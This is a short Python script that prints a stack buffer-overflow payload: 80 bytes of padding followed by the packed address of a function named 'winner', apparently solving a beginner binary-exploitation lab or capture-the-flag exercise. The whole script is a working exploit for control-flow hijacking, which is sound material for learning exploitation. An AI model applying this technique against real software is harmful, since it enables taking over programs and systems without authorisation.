#!/usr/bin/env python

from __future__ import print_function
from functools import partial
import struct


p64 = partial(struct.pack, "<Q")
p32 = partial(struct.pack, "<I")
pr = partial(print, end="")


winner = 0x4005f6

pr("a" * 64 + "b" * 16 + p32(winner))
